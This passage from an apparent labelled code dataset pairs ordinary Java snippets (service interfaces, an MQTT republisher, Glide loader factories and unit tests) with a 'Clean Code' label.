    processInstance.setStartUserId(String.valueOf(startUserId));
    when(processInstanceService.getProcessInstance(eq(execution.getProcessInstanceId()))).thenReturn(processInstance);
    return execution;
  }
}
",0,Clean Code
"public class SafeZipFileTest {
  private File testZipFile;
  private ZipOutputStream zipOutputStream;
  @Before public void setUp() throws Exception {
    testZipFile=File.createTempFile(""SafeZipFileTest"","".zip"");
    zipOutputStream=new ZipOutputStream(new FileOutputStream(testZipFile));
  }
  @After public void tearDown() throws Exception {
    zipOutputStream.close();
    boolean success=testZipFile.delete();
    if (!success) {
      throw new RuntimeException(""删除临时文件失败"");
    }
  }
  @Test public void testContainsManifest() throws IOException {
    ZipOutputStream out=this.zipOutputStream;
    ZipEntry e=new ZipEntry(""META-INF/MANIFEST.MF"");
    out.putNextEntry(e);
    byte[] data=""测试内容"".getBytes();
    out.write(data,0,data.length);
    out.closeEntry();
    out.close();
    ZipFile zipFile=new SafeZipFile(testZipFile);
    Enumeration<? extends ZipEntry> entries=zipFile.entries();
    if (entries.hasMoreElements()) {
      ZipEntry entry=entries.nextElement();
      String entryName=entry.getName();
      Assert.assertTrue(entryName.length() > 0);
    }
    zipFile.close();
  }
}
",0,Clean Code
"/** 
 * 语言工具
 * @author wangchao
 * @version 1.0.0
 * @date 2020/02/12
 * @since 2019-12-08 03:16:00
 */
public class LanguageUtil {
  private LanguageUtil(){
  }
  /** 
 * 是否是中文
 * @param c c
 * @return boolean
 */
  private static boolean isChinese(  char c){
    Character.UnicodeBlock ub=Character.UnicodeBlock.of(c);
    return ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS || ub == Character.UnicodeBlock.CJK_COMPATIBILITY_IDEOGRAPHS || ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS_EXTENSION_A || ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS_EXTENSION_B || ub == Character.UnicodeBlock.CJK_SYMBOLS_AND_PUNCTUATION || ub == Character.UnicodeBlock.HALFWIDTH_AND_FULLWIDTH_FORMS || ub == Character.UnicodeBlock.GENERAL_PUNCTUATION;
  }
  /** 
 * 是否含有中文
 * @param str str
 * @return boolean
 */
  public static boolean isChinese(  String str){
    char[] ch=str.toCharArray();
    for (    char c : ch) {
      if (isChinese(c)) {
        return true;
      }
    }
    return false;
  }
  /** 
 * 是否是中文字符串
 * @param str str
 * @return boolean
 */
  public static boolean isAllChinese(  String str){
    char[] ch=str.toCharArray();
    for (    char c : ch) {
      if (!isChinese(c)) {
        return false;
      }
    }
    return true;
  }
}",0,Clean Code
"class InternalRepublisher {
  private static final Logger LOG=LoggerFactory.getLogger(InternalRepublisher.class);
  private final PersistentQueueMessageSender messageSender;
  InternalRepublisher(  PersistentQueueMessageSender messageSender){
    this.messageSender=messageSender;
  }
  void publishRetained(  ClientSession targetSession,  Collection<IMessagesStore.StoredMessage> messages){
    for (    IMessagesStore.StoredMessage storedMsg : messages) {
      MqttPublishMessage publishMsg=retainedPublish(storedMsg);
      if (storedMsg.getQos() != MqttQoS.AT_MOST_ONCE) {
        LOG.debug(""Adding message to inflight zone. ClientId={}, topic={}"",targetSession.clientID,storedMsg.getTopic());
        int packetID=targetSession.inFlightAckWaiting(storedMsg);
        publishMsg=retainedPublish(storedMsg,packetID);
      }
      this.messageSender.sendPublish(targetSession,publishMsg);
    }
  }
  void publishStored(  ClientSession clientSession,  Queue<IMessagesStore.StoredMessage> publishedEvents){
    IMessagesStore.StoredMessage pubEvt;
    while ((pubEvt=publishedEvents.poll()) != null) {
      LOG.debug(""Adding message ot inflight zone. ClientId={}, guid={}, topic={}"",clientSession.clientID,pubEvt.getGuid(),pubEvt.getTopic());
      int messageId=clientSession.inFlightAckWaiting(pubEvt);
      MqttPublishMessage publishMsg=notRetainedPublish(pubEvt);
      if (publishMsg.fixedHeader().qosLevel() != MqttQoS.AT_MOST_ONCE) {
        publishMsg=notRetainedPublish(pubEvt,messageId);
      }
      this.messageSender.sendPublish(clientSession,publishMsg);
    }
  }
  private MqttPublishMessage notRetainedPublish(  IMessagesStore.StoredMessage storedMessage,  Integer messageID){
    return createPublishForQos(storedMessage.getTopic(),storedMessage.getQos(),storedMessage.getPayload(),false,messageID);
  }
  private MqttPublishMessage notRetainedPublish(  IMessagesStore.StoredMessage storedMessage){
    return createPublishForQos(storedMessage.getTopic(),storedMessage.getQos(),storedMessage.getPayload(),false,0);
  }
  private MqttPublishMessage retainedPublish(  IMessagesStore.StoredMessage storedMessage){
    return createPublishForQos(storedMessage.getTopic(),storedMessage.getQos(),storedMessage.getPayload(),true,0);
  }
  private MqttPublishMessage retainedPublish(  IMessagesStore.StoredMessage storedMessage,  Integer packetID){
    return createPublishForQos(storedMessage.getTopic(),storedMessage.getQos(),storedMessage.getPayload(),true,packetID);
  }
  public static MqttPublishMessage createPublishForQos(  String topic,  MqttQoS qos,  ByteBuf message,  boolean retained,  int messageId){
    MqttFixedHeader fixedHeader=new MqttFixedHeader(MqttMessageType.PUBLISH,false,qos,retained,0);
    MqttPublishVariableHeader varHeader=new MqttPublishVariableHeader(topic,messageId);
    return new MqttPublishMessage(fixedHeader,varHeader,message);
  }
}
",0,Clean Code
"abstract class CommonFragmentSupportTest extends PluginMainAppTest {
  abstract protected String getActivityName();
  abstract protected String expectMsg();
  abstract protected String fragmentType();
  @Override protected Intent getLaunchIntent(){
    Intent pluginIntent=new Intent();
    String packageName=ApplicationProvider.getApplicationContext().getPackageName();
    pluginIntent.setClassName(packageName,""com.tencent.shadow.test.plugin.general_cases.lib.usecases.fragment."" + getActivityName());
    pluginIntent.putExtra(""FragmentType"",fragmentType());
    return pluginIntent;
  }
  @Test public void setArguments(){
    matchTextWithViewTag(""TestFragmentTextView"",expectMsg());
  }
  @Test public void fragmentStartActivity(){
    Espresso.onView(ViewMatchers.withTagValue(Matchers.<Object>is(""fragmentStartActivity""))).perform(ViewActions.click());
    matchTextWithViewTag(""finish_button"",""finish"");
  }
  @Test public void attachContext(){
    Assume.assumeTrue(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M);
    matchTextWithViewTag(""AttachContextView"",""com.tencent.shadow.test.plugin.general_cases.lib.usecases.fragment."" + getActivityName());
  }
  @Test public void attachActivity(){
    matchTextWithViewTag(""AttachActivityView"",""com.tencent.shadow.test.plugin.general_cases.lib.usecases.fragment."" + getActivityName());
  }
  @Test public void getActivity(){
    matchTextWithViewTag(""GetActivityView"",""com.tencent.shadow.test.plugin.general_cases.lib.usecases.fragment."" + getActivityName());
  }
  @Test public void getContext(){
    Assume.assumeTrue(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M);
    matchTextWithViewTag(""GetContextView"",""com.tencent.shadow.test.plugin.general_cases.lib.usecases.fragment."" + getActivityName());
  }
  @Test public void getHost(){
    Assume.assumeTrue(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M);
    matchTextWithViewTag(""GetHostView"",""com.tencent.shadow.test.plugin.general_cases.lib.usecases.fragment."" + getActivityName());
  }
}
",0,Clean Code
"/** 
 * The default factory for  {@link StreamStringLoader}s.
 */
public static class Factory implements ModelLoaderFactory<String,InputStream> {
  @Override public ModelLoader<String,InputStream> build(  Context context,  GenericLoaderFactory factories){
    return new StreamStringLoader(factories.buildModelLoader(Uri.class,InputStream.class));
  }
  @Override public void teardown(){
  }
}
/** 
 * The default factory for  {@link StreamResourceLoader}s.
 */
public static class Factory implements ModelLoaderFactory<Integer,InputStream> {
  @Override public ModelLoader<Integer,InputStream> build(  Context context,  GenericLoaderFactory factories){
    return new StreamResourceLoader(context,factories.buildModelLoader(Uri.class,InputStream.class));
  }
  @Override public void teardown(){
  }
}
/** 
 * Factory for  {@link StreamByteArrayLoader}.
 */
public static class Factory implements ModelLoaderFactory<byte[],InputStream> {
  @Override public ModelLoader<byte[],InputStream> build(  Context context,  GenericLoaderFactory factories){
    return new StreamByteArrayLoader();
  }
  @Override public void teardown(){
  }
}
/** 
 * The default factory for  {@link StreamFileLoader}s.
 */
public static class Factory implements ModelLoaderFactory<File,InputStream> {
  @Override public ModelLoader<File,InputStream> build(  Context context,  GenericLoaderFactory factories){
    return new StreamFileLoader(factories.buildModelLoader(Uri.class,InputStream.class));
  }
  @Override public void teardown(){
  }
}
/** 
 * THe default factory for  {@link StreamUriLoader}s.
 */
public static class Factory implements ModelLoaderFactory<Uri,InputStream> {
  @Override public ModelLoader<Uri,InputStream> build(  Context context,  GenericLoaderFactory factories){
    return new StreamUriLoader(context,factories.buildModelLoader(GlideUrl.class,InputStream.class));
  }
  @Override public void teardown(){
  }
}
/** 
 * The default factory for  {@link StreamUrlLoader}s.
 */
public static class Factory implements ModelLoaderFactory<URL,InputStream> {
  @Override public ModelLoader<URL,InputStream> build(  Context context,  GenericLoaderFactory factories){
    return new StreamUrlLoader(factories.buildModelLoader(GlideUrl.class,InputStream.class));
  }
  @Override public void teardown(){
  }
}
/** 
 * The default factory for  {@link HttpUrlGlideUrlLoader}s.
 */
public static class Factory implements ModelLoaderFactory<GlideUrl,InputStream> {
  private final ModelCache<GlideUrl,GlideUrl> modelCache=new ModelCache<GlideUrl,GlideUrl>(500);
  @Override public ModelLoader<GlideUrl,InputStream> build(  Context context,  GenericLoaderFactory factories){
    return new HttpUrlGlideUrlLoader(modelCache);
  }
  @Override public void teardown(){
  }
}
",0,Clean Code
"/** 
 * 会员等级 Service 接口
 * @author owen
 */
public interface MemberLevelService {
  /** 
 * 创建会员等级
 * @param createReqVO 创建信息
 * @return 编号
 */
  Long createLevel(  @Valid MemberLevelCreateReqVO createReqVO);
  /** 
 * 更新会员等级
 * @param updateReqVO 更新信息
 */
  void updateLevel(  @Valid MemberLevelUpdateReqVO updateReqVO);
  /** 
 * 删除会员等级
 * @param id 编号
 */
  void deleteLevel(  Long id);
  /** 
 * 获得会员等级
 * @param id 编号
 * @return 会员等级
 */
  MemberLevelDO getLevel(  Long id);
  /** 
 * 获得会员等级列表
 * @param ids 编号
 * @return 会员等级列表
 */
  List<MemberLevelDO> getLevelList(  Collection<Long> ids);
  /** 
 * 获得会员等级列表
 * @param listReqVO 查询参数
 * @return 会员等级列表
 */
  List<MemberLevelDO> getLevelList(  MemberLevelListReqVO listReqVO);
  /** 
 * 获得指定状态的会员等级列表
 * @param status 状态
 * @return 会员等级列表
 */
  List<MemberLevelDO> getLevelListByStatus(  Integer status);
  /** 
 * 获得开启状态的会员等级列表
 * @return 会员等级列表
 */
  default List<MemberLevelDO> getEnableLevelList(){
    return getLevelListByStatus(CommonStatusEnum.ENABLE.getStatus());
  }
  /** 
 * 修改会员的等级
 * @param updateReqVO 修改参数
 */
  void updateUserLevel(  MemberUserUpdateLevelReqVO updateReqVO);
  /** 
 * 增加会员经验
 * @param userId     会员ID
 * @param experience 经验
 * @param bizType    业务类型
 * @param bizId      业务编号
 */
  void addExperience(  Long userId,  Integer experience,  MemberExperienceBizTypeEnum bizType,  String bizId);
}
",0,Clean Code
"/** 
 * 快递运费模板 Service 接口
 * @author jason
 */
public interface DeliveryExpressTemplateService {
  /** 
 * 创建快递运费模板
 * @param createReqVO 创建信息
 * @return 编号
 */
  Long createDeliveryExpressTemplate(  @Valid DeliveryExpressTemplateCreateReqVO createReqVO);
  /** 
 * 更新快递运费模板
 * @param updateReqVO 更新信息
 */
  void updateDeliveryExpressTemplate(  @Valid DeliveryExpressTemplateUpdateReqVO updateReqVO);
  /** 
 * 删除快递运费模板
 * @param id 编号
 */
  void deleteDeliveryExpressTemplate(  Long id);
  /** 
 * 获得快递运费模板
 * @param id 编号
 * @return 快递运费模板详情
 */
  DeliveryExpressTemplateDetailRespVO getDeliveryExpressTemplate(  Long id);
  /** 
 * 获得快递运费模板列表
 * @param ids 编号
 * @return 快递运费模板列表
 */
  List<DeliveryExpressTemplateDO> getDeliveryExpressTemplateList(  Collection<Long> ids);
  /** 
 * 获得快递运费模板列表
 * @return 快递运费模板列表
 */
  List<DeliveryExpressTemplateDO> getDeliveryExpressTemplateList();
  /** 
 * 获得快递运费模板分页
 * @param pageReqVO 分页查询
 * @return 快递运费模板分页
 */
  PageResult<DeliveryExpressTemplateDO> getDeliveryExpressTemplatePage(  DeliveryExpressTemplatePageReqVO pageReqVO);
  /** 
 * 校验快递运费模板 如果校验不通过，抛出  {@link cn.iocoder.yudao.framework.common.exception.ServiceException} 异常
 * @param templateId 模板编号
 * @return 快递运费模板
 */
  DeliveryExpressTemplateDO validateDeliveryExpressTemplate(  Long templateId);
  /** 
 * 基于运费模板编号数组和收件人地址区域编号，获取匹配运费模板
 * @param ids    编号列表
 * @param areaId 区域编号
 * @return Map (templateId -> 运费模板设置)
 */
  Map<Long,DeliveryExpressTemplateRespBO> getExpressTemplateMapByIdsAndArea(  Collection<Long> ids,  Integer areaId);
}
",0,Clean Code
"/** 
 * @author enjoyyin
 * @date 2022-04-26
 * @since 1.1.0
 */
public class SSOUserServiceImpl extends AppSingletonIntegrationServiceImpl<SSOUserOperation,SSORequestService> implements SSOUserService {
  protected final Logger logger=LoggerFactory.getLogger(getClass());
  private String appConnName;
  public void setAppConnName(  String appConnName){
    this.appConnName=appConnName;
  }
  public String getAppConnName(){
    return appConnName;
  }
  protected <T extends SSOUserOperation>T createSSOUserOperation(  Class<T> clazz){
    List<Class<? extends T>> classes=AppStandardClassUtils.getInstance(appConnName).getClasses(clazz);
    if (CollectionUtils.isEmpty(classes)) {
      logger.info(""no implementation find for {}, ignore to sync user to AppConn {}."",clazz.getSimpleName(),appConnName);
      return null;
    }
    T instance=AppStandardClassUtils.getInstance(appConnName).getInstanceOrWarn(clazz);
    logger.info(""find a implementation {} for {}, ignore to sync user to AppConn {}."",instance.getClass().getName(),clazz.getSimpleName(),appConnName);
    return instance;
  }
  @Override public SSOUserCreationOperation getSSOUserCreationOperation(){
    return getOrCreate(() -> createSSOUserOperation(SSOUserCreationOperation.class),SSOUserCreationOperation.class);
  }
  @Override public SSOUserUpdateOperation getSSOUserUpdateOperation(){
    return getOrCreate(() -> createSSOUserOperation(SSOUserUpdateOperation.class),SSOUserUpdateOperation.class);
  }
  @Override public SSOUserGetOperation getSSOUserGetOperation(){
    return getOrCreate(() -> createSSOUserOperation(SSOUserGetOperation.class),SSOUserGetOperation.class);
  }
  @Override public SSOUserDeletionOperation getSSOUserDeletionOperation(){
    return getOrCreate(() -> createSSOUserOperation(SSOUserDeletionOperation.class),SSOUserDeletionOperation.class);
  }
  @Override protected void initOperation(  SSOUserOperation operation){
    super.initOperation(operation);
    operation.setSSOUserService(this);
  }
}
",0,Clean Code
"/** 
 * 邮件日志 Service 接口
 * @author wangjingyi
 * @since 2022-03-21
 */
public interface MailLogService {
  /** 
 * 邮件日志分页
 * @param pageVO 分页参数
 * @return 分页结果
 */
  PageResult<MailLogDO> getMailLogPage(  MailLogPageReqVO pageVO);
  /** 
 * 获得指定编号的邮件日志
 * @param id 日志编号
 * @return 邮件日志
 */
  MailLogDO getMailLog(  Long id);
  /** 
 * 创建邮件日志
 * @param userId 用户编码
 * @param userType 用户类型
 * @param toMail 收件人邮件
 * @param account 邮件账号信息
 * @param template      模版信息
 * @param templateContent 模版内容
 * @param templateParams 模版参数
 * @param isSend        是否发送成功
 * @return 日志编号
 */
  Long createMailLog(  Long userId,  Integer userType,  String toMail,  MailAccountDO account,  MailTemplateDO template,  String templateContent,  Map<String,Object> templateParams,  Boolean isSend);
  /** 
 * 更新邮件发送结果
 * @param logId  日志编号
 * @param messageId 发送后的消息编号
 * @param exception 发送异常
 */
  void updateMailSendResult(  Long logId,  String messageId,  Exception exception);
}
",0,Clean Code
"public class ImageFeatureExtractor implements Serializable {
  final List<ImageFeature> features;
  private static final ThreadLocal<ImageFeatureExtractor> EXTRACTOR=new ThreadLocal<ImageFeatureExtractor>(){
    @Override protected ImageFeatureExtractor initialValue(){
      return new ImageFeatureExtractor();
    }
  }
;
  public static ImageFeatureExtractor getInstance(){
    return EXTRACTOR.get();
  }
  private ImageFeatureExtractor(){
    features=new ArrayList<ImageFeature>();
    features.add(new RGBFeature());
    features.add(new HOGFeature());
    features.add(new LBPFeature());
    features.add(new HSVFeature());
  }
  public FeatureVector getFeatureVector(  BufferedImage image){
    FeatureVector featureVector=new FeatureVector();
    Map<String,List<Double>> denseFeatures=new HashMap<>();
    featureVector.setDenseFeatures(denseFeatures);
    for (    ImageFeature feature : features) {
      List<Float> values=feature.extractFeatureSPMK(image);
      List<Double> dblValues=new ArrayList<>();
      for (      Float f : values) {
        dblValues.add(f.doubleValue());
      }
      denseFeatures.put(feature.featureName(),dblValues);
    }
    return featureVector;
  }
}
",0,Clean Code
"public class S3RepositoryTest {
  @BeforeClass public void setUp(){
    System.setProperty(""aws.region"",""us-east-1"");
  }
  @Test public void testLoadModelFromS3() throws MalformedModelException, ModelNotFoundException, IOException {
    S3Client client=S3Client.builder().credentialsProvider(AnonymousCredentialsProvider.create()).region(Region.US_EAST_1).build();
    Repository.registerRepositoryFactory(new S3RepositoryFactory(client));
    Criteria<NDList,NDList> criteria=Criteria.builder().setTypes(NDList.class,NDList.class).optModelUrls(""s3://djl-ai/resources/demo/pytorch/traced_resnet18"").optModelName(""traced_resnet18"").build();
    try (ZooModel<NDList,NDList> model=criteria.loadModel()){
      Assert.assertEquals(model.getName(),""traced_resnet18"");
    }
   }
  @Test public void testLoadArchiveFromS3() throws MalformedModelException, ModelNotFoundException, IOException {
    S3Client client=S3Client.builder().credentialsProvider(AnonymousCredentialsProvider.create()).region(Region.US_EAST_1).build();
    Repository.registerRepositoryFactory(new S3RepositoryFactory(client));
    Criteria<NDList,NDList> criteria=Criteria.builder().setTypes(NDList.class,NDList.class).optModelUrls(""s3://djl-ai/resources/demo/pytorch/traced_resnet18.zip"").optModelName(""traced_resnet18"").build();
    try (ZooModel<NDList,NDList> model=criteria.loadModel()){
      Assert.assertEquals(model.getName(),""traced_resnet18"");
    }
   }
  @Test public void testS3Repository() throws IOException {
    S3Client client=S3Client.builder().credentialsProvider(AnonymousCredentialsProvider.create()).region(Region.US_EAST_1).build();
    Repository.registerRepositoryFactory(new S3RepositoryFactory(client));
    Repository repository=Repository.newInstance(""s3"",""s3://djl-ai/mlrepo/model/cv/image_classification/ai/djl/mxnet/mlp/0.0.1"");
    Assert.assertTrue(repository.isRemote());
    MRL mrl=repository.model(Application.UNDEFINED,""ai.djl.localmodelzoo"",""mlp"");
    Artifact artifact=repository.resolve(mrl,null);
    Assert.assertNotNull(artifact);
    repository=Repository.newInstance(""s3"",""s3://djl-ai/non-exists"");
    artifact=repository.resolve(mrl,null);
    Assert.assertNull(artifact);
  }
  @Test public void testAccessDeny(){
    S3Client client=S3Client.builder().credentialsProvider(AnonymousCredentialsProvider.create()).region(Region.US_EAST_1).build();
    Repository.registerRepositoryFactory(new S3RepositoryFactory(client));
    Repository repository=Repository.newInstance(""s3"",""s3://djl-not-exists/"");
    List<MRL> list=repository.getResources();
    Assert.assertTrue(list.isEmpty());
  }
}
",0,Clean Code
"/** 
 * 客户限制配置 Service 接口
 * @author Wanwan
 */
public interface CrmCustomerLimitConfigService {
  /** 
 * 创建客户限制配置
 * @param createReqVO 创建信息
 * @return 编号
 */
  Long createCustomerLimitConfig(  @Valid CrmCustomerLimitConfigSaveReqVO createReqVO);
  /** 
 * 更新客户限制配置
 * @param updateReqVO 更新信息
 */
  void updateCustomerLimitConfig(  @Valid CrmCustomerLimitConfigSaveReqVO updateReqVO);
  /** 
 * 删除客户限制配置
 * @param id 编号
 */
  void deleteCustomerLimitConfig(  Long id);
  /** 
 * 获得客户限制配置
 * @param id 编号
 * @return 客户限制配置
 */
  CrmCustomerLimitConfigDO getCustomerLimitConfig(  Long id);
  /** 
 * 获得客户限制配置分页
 * @param pageReqVO 分页查询
 * @return 客户限制配置分页
 */
  PageResult<CrmCustomerLimitConfigDO> getCustomerLimitConfigPage(  CrmCustomerLimitConfigPageReqVO pageReqVO);
  /** 
 * 查询用户对应的配置列表
 * @param type   类型
 * @param userId 用户类型
 */
  List<CrmCustomerLimitConfigDO> getCustomerLimitConfigListByUserId(  Integer type,  Long userId);
}
",0,Clean Code
"/** 
 * CRM 联系人与商机的关联 Service 接口
 * @author 芋道源码
 */
public interface CrmContactBusinessService {
  /** 
 * 创建联系人与商机的关联【通过联系人，关联商机】
 * @param createReqVO 创建信息
 */
  void createContactBusinessList(  @Valid CrmContactBusinessReqVO createReqVO);
  /** 
 * 创建联系人与商机的关联【通过商机，关联联系人】
 * @param createReqVO 创建信息
 */
  void createContactBusinessList2(  @Valid CrmContactBusiness2ReqVO createReqVO);
  /** 
 * 删除联系人与商机的关联【通过联系人，取关商机】
 * @param deleteReqVO 删除信息
 */
  void deleteContactBusinessList(  @Valid CrmContactBusinessReqVO deleteReqVO);
  /** 
 * 删除联系人与商机的关联【通过商机，取关联系人】
 * @param deleteReqVO 删除信息
 */
  void deleteContactBusinessList2(  @Valid CrmContactBusiness2ReqVO deleteReqVO);
  /** 
 * 删除联系人与商机的关联，基于联系人编号
 * @param contactId 联系人编号
 */
  void deleteContactBusinessByContactId(  Long contactId);
  /** 
 * 获得联系人与商机的关联列表，基于联系人编号
 * @param contactId 联系人编号
 * @return 联系人商机关联
 */
  List<CrmContactBusinessDO> getContactBusinessListByContactId(  Long contactId);
  /** 
 * 获得联系人与商机的关联列表，基于商机编号
 * @param businessId 商机编号
 * @return 联系人商机关联
 */
  List<CrmContactBusinessDO> getContactBusinessListByBusinessId(  Long businessId);
}
",0,Clean Code
"/** 
 * 商品品牌 Service 接口
 * @author 芋道源码
 */
public interface ProductBrandService {
  /** 
 * 创建品牌
 * @param createReqVO 创建信息
 * @return 编号
 */
  Long createBrand(  @Valid ProductBrandCreateReqVO createReqVO);
  /** 
 * 更新品牌
 * @param updateReqVO 更新信息
 */
  void updateBrand(  @Valid ProductBrandUpdateReqVO updateReqVO);
  /** 
 * 删除品牌
 * @param id 编号
 */
  void deleteBrand(  Long id);
  /** 
 * 获得品牌
 * @param id 编号
 * @return 品牌
 */
  ProductBrandDO getBrand(  Long id);
  /** 
 * 获得品牌列表
 * @param ids 编号
 * @return 品牌列表
 */
  List<ProductBrandDO> getBrandList(  Collection<Long> ids);
  /** 
 * 获得品牌列表
 * @param listReqVO 请求参数
 * @return 品牌列表
 */
  List<ProductBrandDO> getBrandList(  ProductBrandListReqVO listReqVO);
  /** 
 * 验证选择的商品分类是否合法
 * @param id 分类编号
 */
  void validateProductBrand(  Long id);
  /** 
 * 获得品牌分页
 * @param pageReqVO 分页查询
 * @return 品牌分页
 */
  PageResult<ProductBrandDO> getBrandPage(  ProductBrandPageReqVO pageReqVO);
  /** 
 * 获取指定状态的品牌列表
 * @param status 状态
 * @return  返回品牌列表
 */
  List<ProductBrandDO> getBrandListByStatus(  Integer status);
}
",0,Clean Code
"/** 
 * @author zhenyu.nie created on 2019 2019/5/15 12:22
 */
public abstract class AbstractConnection implements Connection {
  private static final Logger logger=LoggerFactory.getLogger(AbstractConnection.class);
  private final String name;
  private final Channel channel;
  private final SettableFuture<Void> closeFuture=SettableFuture.create();
  public AbstractConnection(  String name,  Channel channel){
    this.name=name;
    this.channel=channel;
  }
  public void init(){
    channel.closeFuture().addListener((f) -> closeFuture.set(null));
  }
  @Override public ListenableFuture<WriteResult> write(  Datagram message){
    SettableFuture<WriteResult> result=SettableFuture.create();
    channel.writeAndFlush(message).addListener(future -> {
      if (future.isSuccess()) {
        result.set(WriteResult.success);
      }
 else {
        logger.warn(""{} connection write fail, {}, {}"",name,channel,message);
        result.set(WriteResult.fail);
      }
    }
);
    return result;
  }
  @Override public boolean isActive(){
    return channel.isActive();
  }
  @Override public boolean isWritable(){
    return channel.isWritable();
  }
  @Override public ListenableFuture<Void> closeFuture(){
    return closeFuture;
  }
  @Override public void close(){
    logger.info(""close {} channel {}"",name,channel);
    channel.close();
  }
}
",0,Clean Code
"/** 
 * @author leix.xie
 * @date 2019/9/6 18:48
 * @describe
 */
@Service public class GitRepositoryStoreServiceImpl implements GitRepositoryStoreService {
  private GitRepositoryApi gitlabRepositoryApiImpl;
  private GitRepositoryApi githubRepositoryApiImpl;
  @Autowired private GitPrivateTokenService gitPrivateTokenService;
  private static final String GITLAB=""gitlabv3"";
  private static final String GITHUB=""github"";
  private static final String GIT_KEY=""git.repository"";
  private String gitRepository;
  @PostConstruct public void init(){
    DynamicConfig<LocalDynamicConfig> dynamicConfig=DynamicConfigLoader.load(""config.properties"");
    gitRepository=dynamicConfig.getString(GIT_KEY,"""");
    gitlabRepositoryApiImpl=new GitlabRepositoryApiImpl(gitPrivateTokenService,dynamicConfig);
    githubRepositoryApiImpl=new GithubRepositoryApiImpl(gitPrivateTokenService,dynamicConfig);
  }
  @Override public ApiResult file(  final String projectId,  final String path,  final String ref) throws IOException {
    return getGitRepositoryApi().file(projectId,path,ref);
  }
  @Override public ApiResult fileByClass(  final String projectId,  final String ref,  final String module,  final String className) throws IOException {
    return getGitRepositoryApi().fileByClass(projectId,ref,module,className);
  }
  public final GitRepositoryApi getGitRepositoryApi(){
    if (GITHUB.equalsIgnoreCase(gitRepository)) {
      return githubRepositoryApiImpl;
    }
 else     if (GITLAB.equalsIgnoreCase(gitRepository)) {
      return gitlabRepositoryApiImpl;
    }
    throw new RuntimeException(""未知的仓库类型 "" + gitRepository + ""，请联系管理员"");
  }
  @PreDestroy public void destroy(){
    githubRepositoryApiImpl.destroy();
  }
}
",0,Clean Code
"@SuppressLint(""Registered"") public class ScriptGuideActivity extends IphoneTitleBarActivityCompat {
  @Override public boolean doOnCreate(  Bundle bundle){
    super.doOnCreate(bundle);
    LinearLayout ll=new LinearLayout(this);
    ll.setOrientation(LinearLayout.VERTICAL);
    ViewGroup.LayoutParams mmlp=new ViewGroup.LayoutParams(MATCH_PARENT,MATCH_PARENT);
    LinearLayout __ll=new LinearLayout(this);
    __ll.setOrientation(LinearLayout.VERTICAL);
    ViewGroup bounceScrollView=null;
    bounceScrollView=new BounceScrollView(this,null);
    bounceScrollView.setLayoutParams(mmlp);
    bounceScrollView.addView(ll,new ViewGroup.LayoutParams(MATCH_PARENT,WRAP_CONTENT));
    LinearLayout.LayoutParams fixlp=new LinearLayout.LayoutParams(MATCH_PARENT,dip2px(this,48));
    RelativeLayout.LayoutParams __lp_l=new RelativeLayout.LayoutParams(WRAP_CONTENT,WRAP_CONTENT);
    int mar=(int)(dip2px(this,12) + 0.5f);
    __lp_l.setMargins(mar,0,mar,0);
    __lp_l.addRule(RelativeLayout.ALIGN_PARENT_LEFT);
    __lp_l.addRule(RelativeLayout.CENTER_VERTICAL);
    RelativeLayout.LayoutParams __lp_r=new RelativeLayout.LayoutParams(WRAP_CONTENT,WRAP_CONTENT);
    __lp_r.setMargins(mar,0,mar,0);
    __lp_r.addRule(RelativeLayout.ALIGN_PARENT_RIGHT);
    __lp_r.addRule(RelativeLayout.CENTER_VERTICAL);
    ColorStateList hiColor=ColorStateList.valueOf(Color.argb(255,242,140,72));
    RelativeLayout _t;
    CustomDialog.createFailsafe(this).setTitle(""NavUtils.getParentActivityIntent(this)"").setMessage(String.valueOf(NavUtils.getParentActivityIntent(this))).ok().show();
    ll.addView(subtitle(this,QNScriptManager.error));
    __ll.setLayoutParams(new ViewGroup.LayoutParams(MATCH_PARENT,MATCH_PARENT));
    this.setContentView(bounceScrollView);
    LinearLayout.LayoutParams _lp_fat=new LinearLayout.LayoutParams(MATCH_PARENT,0);
    _lp_fat.weight=1;
    setContentBackgroundDrawable(ResUtils.skin_background);
    setTitle(""脚本帮助"");
    return true;
  }
}
",0,Clean Code
"public class PushDelegateManager {
  private final IPushDelegateManager service;
  public PushDelegateManager(  IPushDelegateManager service){
    this.service=service;
  }
  @SneakyThrows public boolean wechatEnabled(){
    return service.wechatEnabled();
  }
  @SneakyThrows public void setWeChatEnabled(  boolean enabled){
    service.setWeChatEnabled(enabled);
  }
  @SneakyThrows public boolean wechatSoundEnabled(){
    return service.wechatSoundEnabled();
  }
  @SneakyThrows public void setWechatSoundEnabled(  boolean enabled){
    service.setWechatSoundEnabled(enabled);
  }
  @SneakyThrows public boolean wechatContentEnabled(){
    return service.wechatContentEnabled();
  }
  @SneakyThrows public void setWechatContentEnabled(  boolean enabled){
    service.setWechatContentEnabled(enabled);
  }
  @SneakyThrows public boolean wechatVibrateEnabled(){
    return service.wechatVibrateEnabled();
  }
  @SneakyThrows public void setWechatVibrateEnabled(  boolean enabled){
    service.setWechatVibrateEnabled(enabled);
  }
  @SneakyThrows public void mockWechatMessage(){
    service.mockWechatMessage();
  }
  @SneakyThrows public boolean startWechatOnPushEnabled(){
    return service.startWechatOnPushEnabled();
  }
  @SneakyThrows public void setStartWechatOnPushEnabled(  boolean enabled){
    service.setStartWechatOnPushEnabled(enabled);
  }
  @SneakyThrows public boolean skipIfWeChatAppRunningEnabled(){
    return service.skipIfWeChatAppRunningEnabled();
  }
  @SneakyThrows public void setSkipIfWeChatAppRunningEnabled(  boolean enabled){
    service.setSkipIfWeChatAppRunningEnabled(enabled);
  }
  @SneakyThrows public boolean shouldHookBroadcastPerformResult(){
    return service.shouldHookBroadcastPerformResult();
  }
  @SneakyThrows public int onHookBroadcastPerformResult(  Intent intent,  int resultCode){
    return service.onHookBroadcastPerformResult(intent,resultCode);
  }
}
",0,Clean Code
"/** 
 * @Author 鏉窞鐧戒功绉戞妧鏈夐檺鍏徃
 * @create 2023/3/13 14:07
 */
public class FrontendConstant {
  public static final List<String> UN_AUTH_URI_WHITELIST=new ArrayList<>(){
{
      add(""/api/v1/system/config"");
      add(""/api/v1/system/image-captcha"");
      add(""/api/v1/auth/login/password"");
      add(""/api/v1/auth/login/ldap"");
    }
  }
;
  public static final String USER_UPLOAD_IMAGE_TYPE_AVATAR=""avatar"";
